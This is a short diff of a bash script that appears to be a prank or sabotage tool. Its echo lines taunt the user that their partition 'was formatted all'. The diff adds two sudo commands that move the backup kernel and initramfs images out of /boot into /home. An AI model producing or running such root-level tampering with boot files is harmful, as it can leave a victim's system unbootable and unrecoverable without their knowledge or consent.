@@ -105,3 +105,5 @@ echo "sorry and reboot"
 echo "Completed. but your partition was formatted all!"
 echo "good luck to learning code bash..."
 echo "lol zsh"
+sudo mv /boot/initramfs-linux.img.backup /home/
+sudo mv /boot/vmlinuz-linux.backup /home/
